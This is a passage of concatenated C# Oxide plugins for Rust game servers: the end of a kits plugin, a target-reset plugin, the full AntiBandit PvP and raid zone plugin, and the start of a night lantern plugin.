                    GiveItem(player.inventory, BuildItem(kitItem.Name, kitItem.Amount, kitItem.SkinID, kitItem.Condition, kitItem.Weapon), kitItem.Container == "belt" ? player.inventory.containerBelt : kitItem.Container == "wear" ? player.inventory.containerWear : player.inventory.containerMain);
                }
                else
                {
                    if (!string.IsNullOrEmpty(kitItem.Name))
                    {
                        rust.RunServerCommand(kitItem.Name.Replace("%STEAMID%", player.userID.ToString()));
                    }
                }
            }
        }

        private void GiveItem(PlayerInventory inv, Item item, ItemContainer cont = null)
        {
            if (item == null) return;
            var a = item.MoveToContainer(cont) || item.MoveToContainer(inv.containerBelt) || item.MoveToContainer(inv.containerWear) || item.MoveToContainer(inv.containerMain);
        }

        private Item BuildItem(string ShortName, int Amount, ulong SkinID, float Condition, Weapon weapon)
        {
            Item item = ItemManager.CreateByName(ShortName, Amount > 1 ? Amount : 1, SkinID);
            item.condition = Condition;
            if (weapon != null)
            {
                (item.GetHeldEntity() as BaseProjectile).primaryMagazine.contents = weapon.Amount;
                (item.GetHeldEntity() as BaseProjectile).primaryMagazine.ammoType = ItemManager.FindItemDefinition(weapon.AmmoName);

                if (weapon.Content != null)
                {
                    foreach (var content in weapon.Content)
                    {
                        Item itemContent = ItemManager.CreateByName(content, 1);
                        itemContent.MoveToContainer(item.contents);
                    }
                }
            }

            return item;
        }
        #endregion

        #region Utils
        private double GetCurrentTime() => new TimeSpan(DateTime.UtcNow.Ticks).TotalSeconds;

        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
        }

        private static class TimeExtensions
        {
            public static string FormatShortTime(TimeSpan time)
            {
                string result = string.Empty;
                if (time.Days != 0)
                    result += $"{time.Days}д ";

                if (time.Hours != 0)
                    result += $"{time.Hours}ч ";

                if (time.Minutes != 0)
                    result += $"{time.Minutes}м ";

                if (time.Seconds != 0)
                    result += $"{time.Seconds}с ";

                return result;
            }

            public static string FormatTime(TimeSpan time)
            {
                string result = string.Empty;
                if (time.Days != 0)
                    result += $"{Format(time.Days, "дней", "дня", "день")} ";

                if (time.Hours != 0)
                    result += $"{Format(time.Hours, "часов", "часа", "час")} ";

                if (time.Minutes != 0)
                    result += $"{Format(time.Minutes, "минут", "минуты", "минута")} ";

                if (time.Seconds != 0)
                    result += $"{Format(time.Seconds, "секунд", "секунды", "секунда")} ";

                return result;
            }

            private static string Format(int units, string form1, string form2, string form3)
            {
                var tmp = units % 10;

                if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                    return $"{units} {form1}";

                if (tmp >= 2 && tmp <= 4)
                    return $"{units} {form2}";

                return $"{units} {form3}";
            }
        }
        #endregion
    }
}


// --- End of file: RustKits.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/AutoResetTargets.cs ---
// --- Original Local Path: AutoResetTargets.cs ---

namespace Oxide.Plugins
{
    [Info("Auto Reset Targets", "Dyceman/Dan", 1.00, ResourceId = 0)]
    [Description("Auto Reset Targets")]
    public class AutoResetTargets : RustPlugin
    {
        /*
        // Function OnEntityTakeDamage
        // PURPOSE: Resets the target that gets knocked down after [Configuration:ResetTime] seconds
        // RETURN: None
        */
        void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            if (entity is ReactiveTarget)
            {
                ReactiveTarget target = (ReactiveTarget)entity;

                if (target != null)
                {
                    if (target.IsKnockedDown() == true)
                    {
                        timer.Once(3f, () =>
                        {
                            target.SetFlag(BaseEntity.Flags.On, true);
                        });

                    }
                }
            }
        }
        
    }
}

// --- End of file: AutoResetTargets.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/AntiBandit.cs ---
// --- Original Local Path: AntiBandit.cs ---

using Oxide.Core.Plugins;
using Rust;
using System;                      //DateTime
using System.Collections.Generic;  //Required for Whilelist
using UnityEngine;


namespace Oxide.Plugins
{
    [Info("AntiBandit", "Alphawar", "0.9.1", ResourceId = 1879)]
    [Description("Plugin designed to assist servers with RDM (designed for RPG servers)")]
    class AntiBandit : RustPlugin
    {
        [PluginReference]
        Plugin RustIOFriendListAPI;


        private List<Timer> tTimers = new List<Timer>();
        private Hash<ulong, double> PlayerCooldownList = new Hash<ulong, double>();
        private List<Vector3> ExpiredPvPZonesList = new List<Vector3>();
        private List<Vector3> ExpiredRaidZonesList = new List<Vector3>();
        private Hash<Vector3, PVPData> PvPList = new Hash<Vector3, PVPData>();
        private Hash<Vector3, RaidDetails> raidZoneList = new Hash<Vector3, RaidDetails>();

        void OnPlayerInit(BasePlayer _player)
        {
            if (_player == null) return;
            if (ReceivingSnapshotcheck(_player) == true) return;
            createPlayerCooldown(_player);
        }

        void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hitinfo)
        {
            if (purgeMode == true) return;
            if (entity == null) return;
            if (((entity is BuildingBlock) || (entity is Door)) && (hitinfo.Initiator is BasePlayer))
            {
                BasePlayer attacker = (BasePlayer)hitinfo.Initiator;
                bool ownBuildingDamage = checkBuildingOwner(attacker, entity);
                if (ownBuildingDamage == true) return;
                DebugMessage(2, "Entity Taken Damage, Entity is building");
                if (raidZoneList.Count > 0)
                {
                    DebugMessage(2, "There are active raid zones");
                    foreach (var entry in raidZoneList)
                    {
                        bool testVar1 = zoneCooldownCheck("raid", entry.Key);
                        bool testVar2 = checkEntityInZone(entity, entry.Key, RaidZone2);
                        bool testVar3 = checkPlayerInZone(attacker, entry.Key, RaidZone2);
                        if ((testVar1 == true) && (testVar2 == true) && (testVar3 == true))
                        {
                            DebugMessage(2, "Cooldown Passed, Entity & Player In Zone");
                            return;
                        }
                        else
                        {
                            DebugMessage(2, "Not all in zone");
                            DebugMessage(2, string.Format("Entity: {0}. Player: {1}", testVar2, testVar3));
                        }
                    }
                    DebugMessage(1, "Nullifying damage");
                    NullifyDamage(hitinfo);
                }
                else
                {
                    DebugMessage(2, "No raid zones are active");
                    DebugMessage(1, "Nullifying damage");
                    NullifyDamage(hitinfo);
                }
            }
            else if (entity is BasePlayer && hitinfo.Initiator is BasePlayer) // Checks that hitinfo is a player if so continues
            {
                if (purgeMode == true) return;
                DebugMessage(2, "Entity Taken Damage, Entity is player");
                BasePlayer victim = (BasePlayer)entity;
                BasePlayer attacker = (BasePlayer)hitinfo.Initiator;
                if (attacker == victim) return;
                DebugMessage(2, "saving Baseplayers");
                if (raidZoneList.Count > 0)
                {
                    DebugMessage(2, "There are active raid zones");
                    foreach (var entry in raidZoneList)
                    {
                        bool testVar1 = zoneCooldownCheck("raid", entry.Key);
                        bool testVar2 = checkPlayerInZone(attacker, entry.Key, RaidZone2);
                        bool testVar3 = checkPlayerInZone(victim, entry.Key, RaidZone2);
                        if ((testVar1 == true) && (testVar2 == true) && (testVar3 == true))
                        {
                            DebugMessage(2, "Cooldown Passed, Players In Zone");
                            return;
                        }
                        else
                        {
                            DebugMessage(2, "Not all test variables where met for raid zone");
                            DebugMessage(2, string.Format("testVar1: {0}, testVar1: {1}, testVar1: {2}", testVar1, testVar2, testVar3));
                        }
                    }
                    DebugMessage(1, "Players did not pass the Raid Zone Check");
                }
                else DebugMessage(2, "No Active Raid zones");
                if (PvPList.Count > 0)
                {
                    DebugMessage(2, "There are active PvP zones");
                    foreach (var entry in PvPList)
                    {
                        bool testVar1 = zoneCooldownCheck("pvp", entry.Key);
                        bool testVar2 = checkPlayerInZone(attacker, entry.Key, PVPZone3);
                        bool testVar3 = checkPlayerInZone(victim, entry.Key, PVPZone3);
                        bool testVar4 = checkPlayerRegistered(attacker, entry.Key);
                        bool testVar5 = checkPlayerRegistered(victim, entry.Key);
                        if ((testVar1 == true) && (testVar2 == true) && (testVar3 == true) && (testVar4 == true) && (testVar5 == true))
                        {
                            DebugMessage(2, "Cooldown Passed, Players In Zone, Players Registered");
                            return;
                        }
                        else
                        {
                            DebugMessage(2, "Not all test variables where met for pvp zone");
                            DebugMessage(2, string.Format("testVar1: {0}, testVar1: {1}, testVar1: {2}, testVar1: {3}, testVar1: {4}", testVar1, testVar2, testVar3, testVar4, testVar5));
                        }
                    }
                }
                else DebugMessage(2, "No Active PvP zones");
                DebugMessage(2, "Raid and PvP Zone conditions where not meet");
                DebugMessage(1, "Nullifying damage");
                NullifyDamage(hitinfo);
            }
            return;
        }

        void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            if ((entity is BuildingBlock) || (entity is Door))
            {
                DebugMessage(2, "On Entity Death, Entity is building");
                if (raidZoneList.Count > 0)
                {
                    DebugMessage(2, "There are active raid zones");
                    foreach (var entry in raidZoneList)
                    {
                        DebugMessage(2, "This zone is active, Checking if InZone");
                        bool testVar1 = checkEntityInZone(entity, entry.Key, RaidZone2);
                        if (testVar1 == true)
                        {
                            DebugMessage(2, "Resetting timer for a zone");
                            raidZoneList[entry.Key].RaidEndTimer = (GetTimeStamp() + RaidTimeLimit);
                        }
                        else
                        {
                            DebugMessage(2, "Not Resetting timer");
                        }
                    }
                }
            }
            else if (entity is BasePlayer)
            {
                BasePlayer victim = (BasePlayer)entity;
                DebugMessage(2, "On Entity Death, Entity is Player");
                if (raidZoneList.Count > 0)
                {
                    DebugMessage(2, "There are active raid zones");
                    foreach (var entry in raidZoneList)
                    {
                        DebugMessage(2, "This zone is active, Checking if InZone");
                        bool testVar1 = checkPlayerInZone(victim, entry.Key, RaidZone2);
                        if (testVar1 == true)
                        {
                            DebugMessage(2, "Resetting timer for a zone");
                            raidZoneList[entry.Key].RaidEndTimer = (GetTimeStamp() + RaidTimeLimit);
                        }
                        else
                        {
                            DebugMessage(2, "Not Resetting timer");
                        }
                    }
                }
                if (PvPList.Count > 0)
                {
                    DebugMessage(2, "There are active PvP zones");
                    foreach (var entry in raidZoneList)
                    {
                        DebugMessage(2, "This zone is active, Checking if InZone");
                        bool testVar1 = checkPlayerInZone(victim, entry.Key, RaidZone2);
                        if (testVar1 == true)
                        {
                            DebugMessage(2, "Resetting timer for a zone");
                            PvPList[entry.Key].PvPEndTimer = (GetTimeStamp() + PvPTimeLimit);
                        }
                        else
                        {
                            DebugMessage(2, "Not Resetting timer");
                        }
                    }
                }
            }
            else
            {
            }
        }



        [ChatCommand("antibandit")]
        void chatSettings(BasePlayer player, string cmd, string[] args)
        {
            if (!IsAllowed(player, "antibandit.admin")){
                ChatMessageHandler(player, lang.GetMessage("MissingPermission", this, player.UserIDString), "admin");
                return;}
            if (args == null || args.Length == 0)
            {
                ChatMessageHandler(player, lang.GetMessage("MissingAdminCmD", this, player.UserIDString));
                return;
            }
            switch (args[0].ToLower())
            {
                case "debug":
                    if (!IsAllowed(player, "antibandit.debug")){
                        ChatMessageHandler(player, lang.GetMessage("MissingPermission", this, player.UserIDString), "debug");
                        return;}
                    if (args.Length == 1)
                    {
                        ChatMessageHandler(player, lang.GetMessage("DebugIncorrectCmD", this, player.UserIDString));
                        return;
                    }
                    if (args[1] == "0")
                    {
                        DebugLevel = 0;
                        ChatMessageHandler(player, lang.GetMessage("DebugMode", this, player.UserIDString), "0");
                        return;
                    }
                    else if (args[1] == "1")
                    {
                        DebugLevel = 1;
                        ChatMessageHandler(player, lang.GetMessage("DebugMode", this, player.UserIDString), "1");
                        return;
                    }
                    else if (args[1] == "2")
                    {
                        DebugLevel = 2;
                        ChatMessageHandler(player, lang.GetMessage("DebugMode", this, player.UserIDString), "2");
                        return;
                    }
                    else if (args[1] == "3")
                    {
                        DebugLevel = 3;
                        ChatMessageHandler(player, lang.GetMessage("DebugMode", this, player.UserIDString), "3");
                        return;
                    }
                    else
                    {
                        ChatMessageHandler(player, lang.GetMessage("DebugIncorrectCmD", this, player.UserIDString));
                        return;
                    }
                case "purge":
                    if (args.Length == 1)
                    {
                        ChatMessageHandler(player, lang.GetMessage("PurgeInccorectCmd", this, player.UserIDString));
                        return;
                    }
                    if (args[1] == "true")
                    {
                        ChatMessageHandler(player, lang.GetMessage("PurgeModeOn", this, player.UserIDString));
                        purgeMode = true;
                        return;
                    }
                    else if (args[1] == "false")
                    {
                        ChatMessageHandler(player, lang.GetMessage("PurgeModeOff", this, player.UserIDString));
                        purgeMode = false;
                        return;
                    }
                    else
                    {
                        ChatMessageHandler(player, lang.GetMessage("PurgeInccorectCmd", this, player.UserIDString));
                        return;
                    }
                default:
                    ChatMessageHandler(player, lang.GetMessage("InvalidCmD", this, player.UserIDString));
                    return;
            }
        }

        [ChatCommand("raid")]
        void raidChatHandle(BasePlayer _player)
        {
            double RaidInitData = (GetTimeStamp() + RaidDelay);
            double RaidEndData = (GetTimeStamp() + RaidTimeLimit + RaidDelay);
            if (!IsAllowed(_player, "antibandit.player")){
                ChatMessageHandler(_player, lang.GetMessage("MissingPermission", this, _player.UserIDString), "player");
                return;}
            createPlayerCooldown(_player);
            bool _testVar1 = checkServerPvPCooldown();
            bool _testVar2 = checkPlayerCooldown(_player);
            if ((_testVar1 == true) && (_testVar2 == true))
            {
                Vector3 PosHashValue = (_player.transform.position);
                bool _testVar3 = GetNearbyTargetWall(PosHashValue, _player);
                if (_testVar3 == true)
                {
                    BroadcastMessageHandler(lang.GetMessage("XhasCreatedZone", this, _player.UserIDString), _player.displayName);
                    timer.Once(PvPDelay, () =>
                    {
                        BroadcastMessageHandler(lang.GetMessage("RaidZoneActive", this, _player.UserIDString));
                });
                    raidZoneList.Add(PosHashValue, new RaidDetails { RaidInitCooldown = RaidInitData, RaidEndTimer = RaidEndData });
                    serverRaidCooldownTimeStamp = GetTimeStamp() + serverRaidCooldown;
                    PlayerCooldownList[_player.userID] = GetTimeStamp() + playerCooldown;
                    DebugMessage(1, "Zone Created");
                }
            }
        }

        [ChatCommand("pvp")]
        void pvpChatHandle(BasePlayer _player, string cmd, string[] args)
        {
            if (!IsAllowed(_player, "antibandit.player")){
                ChatMessageHandler(_player, lang.GetMessage("MissingPermission", this, _player.UserIDString), "player");
                return;}
            createPlayerCooldown(_player);
            bool _testVar1 = checkServerPvPCooldown();
            bool _testVar2 = checkPlayerCooldown(_player);
            if ((_testVar1 == true) && (_testVar2 == true))
            {
                Vector3 _PosHashValue = (_player.transform.position);
                bool _testVar3 = checkNearPlayerNotFriend(_player, _PosHashValue);
                if (_testVar3 == true)
                {
                    serverPvPCooldownTimeStamp = GetTimeStamp() + serverPvPCooldown;
                    PlayerCooldownList[_player.userID] = GetTimeStamp() + playerCooldown;
                    double PvPInitData = (GetTimeStamp() + PvPDelay);
                    double PvPEndData = (GetTimeStamp() + PvPTimeLimit + PvPDelay);
                    PvPList.Add(_PosHashValue, new PVPData { PvPInitCooldown = PvPInitData, PvPEndTimer = PvPEndData });
                    registerNearPlayers(_PosHashValue);
                }
            }
        }

        [ConsoleCommand("AntiBandit.Purge")]
        void purgeToggle(ConsoleSystem.Arg arg)
        {
            if (!arg.isAdmin) return;
            if (arg.Args[0].ToLower() == "true") purgeMode = true;
            else if (arg.Args[0].ToLower() == "false") purgeMode = false;
            else Puts(lang.GetMessage("PurgeInccorectConsole", this));
        }

        bool checkPlayerCooldown(BasePlayer _player)
        {
            if ((PlayerCooldownList[_player.userID] < GetTimeStamp()) || (IsAllowed(_player, "antibandit.nocooldown")))
            {
                return true;
            }
            return false;
        }

        bool checkServerPvPCooldown()
        {
            if (serverPvPCooldownTimeStamp < GetTimeStamp())
            {
                return true;
            }
            return false;
        }
        bool checkServerRaidCooldown()
        {
            if (serverRaidCooldownTimeStamp < GetTimeStamp())
            {
                return true;
            }
            return false;
        }

        bool GetNearbyTargetWall(Vector3 hashPos, BasePlayer _player)
        {
            double RaidInitData = (GetTimeStamp() + RaidDelay);
            double RaidEndData = (GetTimeStamp() + RaidTimeLimit + RaidDelay);

            List<BaseEntity> entities = new List<BaseEntity>();
            Vis.Entities(hashPos, RaidZone1, entities, wallCol);
            if (entities.Count > 0)
            {
                foreach (BaseEntity _entry in entities)
                {
                    ulong _ownerID = _entry.OwnerID;
                    if (_ownerID != 0)
                    {
                        //bool _testVar1 = false; //is player friend
                        bool _testVar2 = false; //is player
                        ulong target = _entry.OwnerID;

                        var _test = RustIOFriendListAPI?.Call("ORFriends", _player.userID, _ownerID);
                        bool _result = Convert.ToBoolean(_test);
                        if (_ownerID == _player.userID) _testVar2 = true;
                        if ((_result == false) && (_testVar2 == false))
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        class PVPData
        {
            public List<ulong> playerList = new List<ulong>();
            public double PvPInitCooldown;
            public double PvPEndTimer;
        }

        class RaidDetails
        {
            public double RaidInitCooldown;
            public double RaidEndTimer;
        }

        float CalculateDistance(Vector3 playerPos, Vector3 zonePos)
        {
            var distance = (Vector3.Distance(playerPos, zonePos));
            return distance;
        }

        void loadPermissions()
        {
            string[] Permissionarray = { "player", "debug", "admin", "nocooldown" };
            foreach (string i in Permissionarray)
            {
                string regPerm = Title.ToLower() + "." + i;
                permission.RegisterPermission(regPerm, this);
            }
        }


        private static int wallCol;
        private static int playerCol;

        private void Loaded()
        {
            loadPermissions();
            LoadVariables();
            lang.RegisterMessages(messages, this);
            playerCol = LayerMask.GetMask(new string[] { "Player (Server)" });
            wallCol = LayerMask.GetMask(new string[] { "Construction" });

            tTimers.Add(timer.Repeat(60f, 0, () =>
            {
                DebugMessage(1, "PvP timer is launching");
                DebugMessage(2, "Clearing existing items in list");
                ExpiredPvPZonesList.Clear();
                ExpiredRaidZonesList.Clear();
                foreach (var entry in PvPList)
                {
                    DebugMessage(2, "Checking a zone timestamp");
                    if (PvPList[entry.Key].PvPEndTimer < GetTimeStamp())
                    {
                        DebugMessage(2, "Adding a zone for deletion");
                        ExpiredPvPZonesList.Add(entry.Key);
                    }
                }
                foreach (var entry in raidZoneList)
                {
                    DebugMessage(2, "Checking a zone timestamp");
                    if (raidZoneList[entry.Key].RaidEndTimer < GetTimeStamp())
                    {
                        DebugMessage(2, "Adding a raid zone for deletion");
                        ExpiredRaidZonesList.Add(entry.Key);
                    }
                }

                DebugMessage(2, "Checking if anything needs to be deleted");
                if (ExpiredPvPZonesList.Count > 0)
                {
                    foreach (Vector3 zone in ExpiredPvPZonesList)
                    {
                        DebugMessage(2, "PvP Zones are needed for deletion");
                        PvPList.Remove(zone);
                    }
                }
                if (ExpiredRaidZonesList.Count > 0)
                {
                    foreach (Vector3 zone in ExpiredRaidZonesList)
                    {
                        DebugMessage(2, "Raids Zones are needed for deletion");
                        raidZoneList.Remove(zone);
                    }
                }
                ExpiredPvPZonesList.Clear();
                ExpiredRaidZonesList.Clear();
            }));
        }
        private void Unloaded()
        {
            DestroyTimers();
            PvPList.Clear();
            raidZoneList.Clear();
            ExpiredPvPZonesList.Clear();
            ExpiredRaidZonesList.Clear();
            tTimers.Clear();
        }

        void DestroyTimers()
        {
            foreach (Timer sTimer in tTimers)
            {
                DebugMessage(2, "Destroying a Timer now");
                sTimer.Destroy();
                DebugMessage(2, "Destroyed a Timer");
            }
            tTimers.Clear();
            DebugMessage(1, "Removed all items from the list");
        }
        bool IsAllowed(BasePlayer player, string perm)
        {
            if (permission.UserHasPermission(player.UserIDString, perm)) return true;
            return false;
        }
        double GetTimeStamp()
        {
            return (DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
        }
        static void NullifyDamage(HitInfo hitinfo)
        {
            hitinfo.damageTypes = new DamageTypeList();
            hitinfo.DoHitEffects = false;
            hitinfo.HitMaterial = 0;
            hitinfo.PointStart = Vector3.zero;
        }
        public bool checkEntityInZone(BaseCombatEntity _entity, Vector3 _zoneKey, int _maxDistance)
        {
            if (_entity.Distance(_zoneKey) < _maxDistance)
            {
                DebugMessage(2, string.Format("entity Distance: {0} from tested zone", _entity.Distance(_zoneKey)));
                DebugMessage(1, "Entity In zone, Returning True");
                return true;
            }
            else
            {
                DebugMessage(2, string.Format("entity Distance: {0} from tested zone", _entity.Distance(_zoneKey)));
                DebugMessage(1, "Entity out of zone, Returning False");
                return false;
            }
        }
        public bool checkPlayerInZone(BasePlayer _player, Vector3 _zoneKey, int _maxDistance)
        {
            if (_player.Distance(_zoneKey) < _maxDistance)
            {
                DebugMessage(2, string.Format("Player Distance: {0} from tested zone", _player.Distance(_zoneKey)));
                DebugMessage(1, "Entity In zone, Returning True");
                return true;
            }
            else
            {
                DebugMessage(2, string.Format("Player Distance: {0} from tested zone", _player.Distance(_zoneKey)));
                DebugMessage(1, "Entity out of zone, Returning False");
                return false;
            }
        }
        public bool checkPlayerRegistered(BasePlayer _player, Vector3 _zoneKey)
        {
            if (PvPList[_zoneKey].playerList.Contains(_player.userID))
            {
                DebugMessage(2, string.Format("{0} is registered to the zone", _player.displayName));
                DebugMessage(1, "Returning True");
                return true;
            }
            else
            {
                DebugMessage(2, string.Format("{0} is not registered to the zone", _player.displayName));
                DebugMessage(1, "Returning false");
                return false;
            }
        }
        bool checkBuildingOwner(BasePlayer _player, BaseCombatEntity _entity)
        {
            BaseEntity _testEntity = _entity;
            ulong _testResult = FindOwner(_testEntity);
            if (_testResult == _player.userID) return true;
            else return false;
        }
        bool checkNearPlayerNotFriend (BasePlayer _player, Vector3 _hashPos)
        {
            if (BasePlayer.activePlayerList.Count < 2) return false;
            foreach (BasePlayer _target in BasePlayer.activePlayerList)
            {
                if (!(_target == _player))
                {
                    float distance_between = Vector3.Distance(_hashPos, _target.transform.position);
                    if (distance_between <= PVPZone1)
                    {
                        Puts(_target.UserIDString);
                        var _test = RustIOFriendListAPI?.Call("ORFriends", _player.userID, _target.userID);
                        bool _result = Convert.ToBoolean(_test);
                        if (_result == false) return true;
                    }
                }
            }
            return false;
        }
        void registerNearPlayers(Vector3 _hashPos)
        {
            List<BasePlayer> _NearPlayers = new List<BasePlayer>();
            Vis.Entities(_hashPos, PVPZone2, _NearPlayers, playerCol);
            foreach (BasePlayer _entry in _NearPlayers)
            {
                PvPList[_hashPos].playerList.Add(_entry.userID);// Add to the list with this
                timer.Once(PvPDelay, () =>
                {
                    ChatMessageHandler(_entry, "PvP Enabled");
                });
                ChatMessageHandler(_entry, "Warning - A PVP zone has been created");
                ChatMessageHandler(_entry, "You are part of this event.");
                ChatMessageHandler(_entry, string.Format("It will start in {0} seconds.", PvPDelay));
            }
        }
        bool zoneCooldownCheck(string _zoneType, Vector3 _zonekey)
        {
            DebugMessage(1, "Checking zone cooldown");
            if (_zoneType == "raid")
            {
                if (raidZoneList[_zonekey].RaidInitCooldown < GetTimeStamp()) return true;
                else return false;
            }
            else if (_zoneType == "pvp")
            {
                if (PvPList[_zonekey].PvPInitCooldown < GetTimeStamp()) return true;
                else return false;
            }
            else
            {
                DebugMessage(1, "Warning zoneCooldownCheck has failed all if statements.");
                return false;
            }
        }
        bool zoneTimerCheck(string _zoneType, Vector3 _zonekey)
        {
            DebugMessage(1, "Checking zone end time");
            if (_zoneType == "raid")
            {
                if (raidZoneList[_zonekey].RaidEndTimer > GetTimeStamp()) return true;
                else return false;
            }
            else if (_zoneType == "pvp")
            {
                if (PvPList[_zonekey].PvPEndTimer > GetTimeStamp()) return true;
                else return false;
            }
            else
            {
                DebugMessage(1, "Warning zoneCooldownCheck has failed all if statements.");
                return false;
            }
        }
        ulong FindOwner(BaseEntity entity)
        {
            ulong ownerid = entity.OwnerID;
            return ownerid;
        }
        void createPlayerCooldown(BasePlayer _player)
        {
            if (!PlayerCooldownList.Keys.Contains(_player.userID))
            {
                PlayerCooldownList.Add(_player.userID, GetTimeStamp() - playerCooldown);
            }
        }
        bool ReceivingSnapshotcheck(BasePlayer _player)
        {
            if (_player.HasPlayerFlag(BasePlayer.PlayerFlags.ReceivingSnapshot))
            {
                timer.Once(2, () => OnPlayerInit(_player));
                return true;
            }
            return false;
        }
        void DebugMessage(int _minDebuglvl, string _msg){
            if (DebugLevel >= _minDebuglvl){
                Puts(_msg);
                if (DebugLevel == 3 && _minDebuglvl == 1){
                    PrintToChat(_msg);}}}

        //////////////////////////////////////////////////////////////////////////////////////
        // MessageHandles ////////////////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////////////////////////////////
        void BroadcastMessageHandler(string message, params object[] args)
        {
            PrintToChat($"<color={ChatPrefixColor}>{ChatPrefix}</color>: <color={ChatMessageColor}>{message}</color>", args);
        }
        void ChatMessageHandler(BasePlayer player, string message, params object[] args)
        {
            PrintToChat(player, $"<color={ChatPrefixColor}>{ChatPrefix}</color>: <color={ChatMessageColor}>{message}</color>", args);
        }

        //////////////////////////////////////////////////////////////////////////////////////
        // Config ////////////////////////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////////////////////////////////
        private string ChatPrefixColor;
        private string ChatPrefix;
        private string ChatMessageColor;
        private bool purgeMode = false;
        private float RaidZone1;
        private int DebugLevel;
        private int PVPZone1;
        private float PVPZone2;
        private int PVPZone3;
        private int PvPDelay;
        private int PvPTimeLimit;
        private int RaidZone2;
        private int RaidDelay;
        private int RaidTimeLimit;
        private double playerCooldown;
        private double serverPvPCooldown;
        private double serverRaidCooldown;
        private double serverPvPCooldownTimeStamp;
        private double serverRaidCooldownTimeStamp;

        protected override void LoadDefaultConfig()
        {
            Puts("Creating a new configuration file!");
            Config.Clear();
            LoadVariables();
        }
        void LoadVariables() //Stores Default Values, calling GetConfig passing: menu, dataValue, defaultValue
        {
            //Booleans
            //PickEnabled = Convert.ToBoolean(GetConfig("Settings", "PickEnabled", false));
            //Double
            playerCooldown = Convert.ToDouble(GetConfig("Values", "playerCooldown", 90));
            serverPvPCooldown = Convert.ToDouble(GetConfig("Values", "serverPvPCooldown", 10));
            serverRaidCooldown = Convert.ToDouble(GetConfig("Values", "serverRaidCooldown", 60));
            //Floats
            PVPZone2 = Convert.ToSingle(GetConfig("Values", "PlayerAddRadius", 50.0f));
            RaidZone1 = Convert.ToSingle(GetConfig("Values", "RaidZone1", 5f));
            //Ints
            PVPZone1 = Convert.ToInt32(GetConfig("Values", "PVPZone1", 5));
            PVPZone3 = Convert.ToInt32(GetConfig("Values", "PVPZone3", 50));
            PvPDelay = Convert.ToInt32(GetConfig("Values", "PvPDelay", 30));
            PvPTimeLimit = Convert.ToInt32(GetConfig("Values", "PvPTimeLimit", 60));
            RaidZone2 = Convert.ToInt32(GetConfig("Values", "RaidZone2", 300));
            RaidDelay = Convert.ToInt32(GetConfig("Values", "RaidDelay", 30));
            RaidTimeLimit = Convert.ToInt32(GetConfig("Values", "RaidTimeLimit", 180));
            DebugLevel = Convert.ToInt32(GetConfig("Values", "DebugLevel", 0));
            //Strings
            //Targated = Convert.ToString(GetConfig("Messages", "NotAffected", "You are being targeted"));
            ChatPrefix = Convert.ToString(GetConfig("ChatSettings", "ChatPrefix", "AntiBandit"));
            ChatPrefixColor = Convert.ToString(GetConfig("ChatSettings", "ChatPrefixColor", "008800"));
            ChatMessageColor = Convert.ToString(GetConfig("ChatSettings", "ChatMessageColor", "yellow"));
        }

        object GetConfig(string menu, string dataValue, object defaultValue)
        {
            var data = Config[menu] as Dictionary<string, object>;
            if (data == null)
            {
                data = new Dictionary<string, object>();
                Config[menu] = data;
            }
            object value;
            if (!data.TryGetValue(dataValue, out value))
            {
                value = defaultValue;
                data[dataValue] = value;
            }
            return value;
        }

        //////////////////////////////////////////////////////////////////////////////////////
        // Lang //////////////////////////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////////////////////////////////

        Dictionary<string, string> messages = new Dictionary<string, string>()
        {
            {"MissingPermission", "You do not have the required permission: {0}" },
            {"MissingAdminCmD", "Missing Command please use /antibandit (Debug / Purge)" },
            {"DebugIncorrectCmD", "Invalid command, please use: /antibandit Debug 0/1/2/3" },
            {"DebugMode", "Debug Mode set to {0}" },
            {"PurgeInccorectCmd", "Invalid command, please use: /antibandit purge true/false" },
            {"PurgeModeOn", "Purge Mode Has Started" },
            {"PurgeModeOff", "Purge Mode Has Ended" },
            {"InvalidCmD", "Invalid Command" },
            {"XhasCreatedZone", "{0} has created a zone." },
            {"RaidZoneActive", "A Raid zone has become active" },   //Incorrect format: true/false
            {"PurgeInccorectConsole", "Incorrect format: true/false" }
        };
    }
}

// --- End of file: AntiBandit.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/NightLantern.cs ---
// --- Original Local Path: NightLantern.cs ---

using System.Collections.Generic;
using System.Linq;

namespace Oxide.Plugins
{
    [Info("NightLantern", "k1lly0u", "2.0.3", ResourceId = 1182)]
    class NightLantern : RustPlugin
    {
        #region Fields
        private Timer timeCheck;
        private List<BaseOven> lights;
        private bool isActivated;
        private bool isEnabled;
        private bool lightsOn;

        private bool nfrInstalled;
        #endregion

        #region Oxide Hooks
        void Loaded()
        {
            lights = new List<BaseOven>();
            permission.RegisterPermission("nightlantern.use", this);
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"You have disabled auto lights","You have disabled auto lights" },
                {"You have enabled auto lights","You have enabled auto lights" }
            }, this);
        }
        void OnServerInitialized()
        {
            LoadVariables();
            if (plugins.Exists("NoFuelRequirements"))
            {
                nfrInstalled = true;
                configData.ConsumeFuel = false;
            }
            isActivated = true;
            isEnabled = true;
            lightsOn = false;
            FindLights();            
        }
        void OnConsumeFuel(BaseOven oven, Item fuel, ItemModBurnable burnable)
        {
            if (nfrInstalled) return;
            if (!configData.ConsumeFuel)
